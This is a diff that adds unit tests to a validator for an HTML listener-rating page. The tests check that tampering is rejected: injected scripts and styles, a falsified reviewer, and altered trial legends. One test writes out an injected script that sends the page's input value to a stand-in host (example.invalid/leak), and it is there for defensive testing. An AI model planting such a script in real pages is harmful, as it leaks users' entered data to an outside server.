@@ -149,6 +149,45 @@ class ListenerControlTests(unittest.TestCase):
         self.mutate('</html>', '<template>hidden answers</template></html>')
         self.reject()
 
+    def test_injected_second_inline_script_is_rejected(self):
+        self.mutate('</html>',
+                    '<script>fetch("https://example.invalid/leak?code=" + '
+                    'document.querySelector("input").value)</script></html>')
+        self.reject()
+
+    def test_single_inline_script_tampering_is_rejected(self):
+        self.mutate("const reviewer=f.get('reviewer');",
+                    "const reviewer='falsified-listener';")
+        self.reject()
+
+    def test_removed_download_handler_is_rejected(self):
+        self.mutate("a.download='mixlab-ratings.json';", "a.download='';")
+        self.reject()
+
+    def test_style_can_not_hide_the_rating_form(self):
+        self.mutate('fieldset{border:1px', 'fieldset{display:none;border:1px')
+        self.reject()
+
+    def test_added_style_block_is_rejected(self):
+        self.mutate('</html>', '<style>button{display:none}</style></html>')
+        self.reject()
+
+    def test_missing_trial_legend_is_rejected(self):
+        self.mutate('<legend>trial-001</legend>', '')
+        self.reject()
+
+    def test_misleading_trial_legend_is_rejected(self):
+        self.mutate('<legend>trial-001</legend>', '<legend>trial-002</legend>')
+        self.reject()
+
+    def test_ratings_submit_must_have_visible_label(self):
+        self.mutate('<button>Download my ratings</button>', '<button></button>')
+        self.reject()
+
+    def test_missing_document_language_is_rejected(self):
+        self.mutate('<html lang="en">', '<html>')
+        self.reject()
+
     def test_valid_one_trial(self):
         write_review(self.path, ["trial-001"], "f" * 64)
         self.assertEqual(check_review_controls(self.path)["trial_count"], 1)
